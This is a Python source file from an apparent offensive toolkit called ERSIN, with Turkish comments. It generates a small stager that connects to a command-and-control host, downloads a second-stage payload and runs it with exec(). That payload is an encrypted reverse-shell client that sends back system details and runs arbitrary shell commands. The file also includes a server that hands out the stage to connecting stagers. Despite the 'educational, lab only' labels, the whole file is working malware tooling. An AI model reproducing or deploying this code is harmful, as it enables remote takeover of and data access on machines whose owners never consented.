"""
ERSIN - Stager Generator
Stage'lı payload oluşturma: küçük stager → sunucudan asıl payload'ı çeker
"""

import base64
import os
import socket
import textwrap
from datetime import datetime

from shared.config import (
    DEFAULT_C2_HOST, DEFAULT_C2_PORT, DEFAULT_STAGER_PORT,
    STAGE_DIR, Colors, log_event,
)
from shared.crypto import ErsinCrypto


class StagerGenerator:
    """
    İki aşamalı payload üretici:
    1. Stager (küçük): Sunucuya bağlanıp asıl payload'ı indirir
    2. Stage (asıl payload): Reverse shell / C2 client
    """

    def __init__(self, c2_host: str = DEFAULT_C2_HOST,
                 c2_port: int = DEFAULT_C2_PORT,
                 stager_port: int = DEFAULT_STAGER_PORT):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.stager_port = stager_port

    def generate_stage(self, output_path: str = None) -> str:
        """
        Ana stage payload'ını oluştur.
        Bu, C2 sunucusuna bağlanan tam reverse shell client'ıdır.
        """
        stage_code = textwrap.dedent(f'''\
#!/usr/bin/env python3
"""
ERSIN Stage Payload - Eğitim Amaçlı
Bu dosya C2 sunucusuna bağlanarak reverse shell sağlar.
UYARI: Sadece eğitim ve lab ortamında kullanın!
"""

import socket
import subprocess
import json
import time
import struct
import hashlib
import os
import platform
import sys
import threading

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as sym_padding
from cryptography.hazmat.backends import default_backend


# Yapılandırma
C2_HOST = "{self.c2_host}"
C2_PORT = {self.c2_port}
RETRY_DELAY = 5
MAX_RETRIES = 10

MAGIC = b"ERSN"
END_MARKER = b"NRSE"


class StageCrypto:
    def __init__(self, key: bytes):
        self.key = key

    def encrypt(self, plaintext: bytes) -> bytes:
        iv = os.urandom(16)
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        padder = sym_padding.PKCS7(128).padder()
        padded = padder.update(plaintext) + padder.finalize()
        encrypted = encryptor.update(padded) + encryptor.finalize()
        return iv + encrypted

    def decrypt(self, ciphertext: bytes) -> bytes:
        iv = ciphertext[:16]
        data = ciphertext[16:]
        cipher = Cipher(algorithms.AES(self.key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded = decryptor.update(data) + decryptor.finalize()
        unpadder = sym_padding.PKCS7(128).unpadder()
        return unpadder.update(padded) + unpadder.finalize()


def recv_exact(sock, n):
    data = b""
    while len(data) < n:
        chunk = sock.recv(n - len(data))
        if not chunk:
            return None
        data += chunk
    return data


def send_msg(sock, crypto, cmd, data=None):
    msg = json.dumps({{"cmd": cmd, "ts": time.time(), "data": data or {{}}}}).encode()
    encrypted = crypto.encrypt(msg)
    payload_hash = hashlib.sha256(encrypted).digest()
    packet = MAGIC + struct.pack("!I", len(encrypted)) + payload_hash + encrypted + END_MARKER
    sock.sendall(struct.pack("!I", len(packet)))
    sock.sendall(packet)


def recv_msg(sock, crypto):
    size_data = recv_exact(sock, 4)
    if not size_data:
        return None
    pkt_size = struct.unpack("!I", size_data)[0]
    packet = recv_exact(sock, pkt_size)
    if not packet or not packet.startswith(MAGIC):
        return None
    off = 4
    length = struct.unpack("!I", packet[off:off+4])[0]
    off += 4
    expected_hash = packet[off:off+32]
    off += 32
    enc = packet[off:off+length]
    off += length
    if packet[off:off+4] != END_MARKER:
        return None
    if hashlib.sha256(enc).digest() != expected_hash:
        return None
    try:
        dec = crypto.decrypt(enc)
        return json.loads(dec.decode())
    except Exception:
        return None


def get_sysinfo():
    return {{
        "os": platform.system(),
        "os_version": platform.version(),
        "hostname": platform.node(),
        "arch": platform.machine(),
        "user": os.getenv("USER") or os.getenv("USERNAME", "unknown"),
        "pid": os.getpid(),
        "cwd": os.getcwd(),
    }}


def heartbeat_loop(sock, crypto, running_flag):
    while running_flag[0]:
        try:
            send_msg(sock, crypto, "ERSIN_HB")
            time.sleep(10)
        except Exception:
            running_flag[0] = False
            break


def main():
    retries = 0
    while retries < MAX_RETRIES:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((C2_HOST, C2_PORT))

            # Anahtar al
            key = recv_exact(sock, 32)
            if not key or len(key) != 32:
                raise ConnectionError("Anahtar alınamadı")

            crypto = StageCrypto(key)
            running = [True]

            # Heartbeat thread
            hb = threading.Thread(target=heartbeat_loop, args=(sock, crypto, running), daemon=True)
            hb.start()

            # Ana döngü
            while running[0]:
                msg = recv_msg(sock, crypto)
                if msg is None:
                    break

                cmd = msg.get("cmd", "")

                if cmd == "ERSIN_SYSINFO":
                    send_msg(sock, crypto, "ERSIN_SYSINFO", get_sysinfo())

                elif cmd == "ERSIN_SHELL":
                    command = msg["data"].get("command", "")
                    try:
                        result = subprocess.run(
                            command, shell=True, capture_output=True,
                            text=True, timeout=30
                        )
                        send_msg(sock, crypto, "ERSIN_SHELL_RES", {{
                            "output": result.stdout,
                            "error": result.stderr,
                            "returncode": result.returncode,
                        }})
                    except subprocess.TimeoutExpired:
                        send_msg(sock, crypto, "ERSIN_SHELL_RES", {{
                            "output": "",
                            "error": "Komut zaman aşımına uğradı (30s)",
                            "returncode": -1,
                        }})
                    except Exception as e:
                        send_msg(sock, crypto, "ERSIN_SHELL_RES", {{
                            "output": "",
                            "error": str(e),
                            "returncode": -1,
                        }})

                elif cmd == "ERSIN_KILL":
                    running[0] = False
                    break

                elif cmd == "ERSIN_HB_ACK":
                    pass

        except Exception:
            retries += 1
            time.sleep(RETRY_DELAY)
            continue
        finally:
            try:
                sock.close()
            except Exception:
                pass

        retries += 1
        time.sleep(RETRY_DELAY)


if __name__ == "__main__":
    main()
''')

        if not output_path:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_path = os.path.join(STAGE_DIR, f"stage_{timestamp}.py")

        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(stage_code)

        log_event("STAGER", "Stage payload oluşturuldu", {"path": output_path})
        return output_path

    def generate_stager(self, output_path: str = None) -> str:
        """
        Küçük stager oluştur: Sunucuya bağlanıp stage payload'ı çeker ve çalıştırır.
        """
        stager_code = textwrap.dedent(f'''\
#!/usr/bin/env python3
"""
ERSIN Stager - Eğitim Amaçlı
Sunucudan asıl payload'ı indirip çalıştırır.
UYARI: Sadece eğitim ve lab ortamında kullanın!
"""
import socket
import sys
import struct

STAGER_HOST = "{self.c2_host}"
STAGER_PORT = {self.stager_port}

def main():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(15)
        sock.connect((STAGER_HOST, STAGER_PORT))

        # Stage boyutunu al
        size_data = b""
        while len(size_data) < 4:
            chunk = sock.recv(4 - len(size_data))
            if not chunk:
                sys.exit(1)
            size_data += chunk

        stage_size = struct.unpack("!I", size_data)[0]

        # Stage kodunu al
        stage_data = b""
        while len(stage_data) < stage_size:
            chunk = sock.recv(min(4096, stage_size - len(stage_data)))
            if not chunk:
                sys.exit(1)
            stage_data += chunk

        sock.close()

        # Stage'i çalıştır
        exec(stage_data.decode("utf-8"), {{"__name__": "__main__"}})

    except Exception:
        sys.exit(1)

if __name__ == "__main__":
    main()
''')

        if not output_path:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            output_path = os.path.join(STAGE_DIR, f"stager_{timestamp}.py")

        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(stager_code)

        log_event("STAGER", "Stager oluşturuldu", {"path": output_path})
        return output_path

    def generate_all(self) -> dict:
        """Hem stager hem stage oluştur."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        stage_path = self.generate_stage(
            os.path.join(STAGE_DIR, f"stage_{timestamp}.py")
        )
        stager_path = self.generate_stager(
            os.path.join(STAGE_DIR, f"stager_{timestamp}.py")
        )
        return {
            "stage": stage_path,
            "stager": stager_path,
        }


class StageServer:
    """Stage dağıtım sunucusu: Stager'lara asıl payload'ı gönderir."""

    def __init__(self, host: str = DEFAULT_C2_HOST,
                 port: int = DEFAULT_STAGER_PORT,
                 stage_path: str = None):
        self.host = host
        self.port = port
        self.stage_path = stage_path
        self.running = False
        self.server_socket = None

    def start(self):
        """Stage dağıtım sunucusunu başlat."""
        if not self.stage_path or not os.path.exists(self.stage_path):
            print(Colors.error("Stage dosyası bulunamadı! Önce generate edin."))
            return

        with open(self.stage_path, "r", encoding="utf-8") as f:
            stage_code = f.read()

        stage_bytes = stage_code.encode("utf-8")

        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.settimeout(1.0)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            self.running = True

            print(Colors.success(f"Stage sunucusu başlatıldı: {self.host}:{self.port}"))
            print(Colors.info(f"Stage boyutu: {len(stage_bytes)} byte"))
            log_event("STAGER", "Stage sunucusu başlatıldı",
                      {"host": self.host, "port": self.port})

            while self.running:
                try:
                    conn, addr = self.server_socket.accept()
                    print(Colors.success(f"Stager bağlantısı: {addr[0]}:{addr[1]}"))
                    log_event("STAGER", f"Stager bağlantısı: {addr[0]}:{addr[1]}")

                    # Stage boyutunu gönder
                    import struct
                    conn.sendall(struct.pack("!I", len(stage_bytes)))
                    # Stage kodunu gönder
                    conn.sendall(stage_bytes)
                    conn.close()

                    print(Colors.success(f"Stage gönderildi: {addr[0]}:{addr[1]}"))

                except socket.timeout:
                    continue

        except OSError as e:
            print(Colors.error(f"Stage sunucusu başlatılamadı: {e}"))
        finally:
            self.stop()

    def stop(self):
        """Stage sunucusunu durdur."""
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except Exception:
                pass
            self.server_socket = None
            print(Colors.info(f"Stage sunucu portu ({self.port}) kapatıldı"))
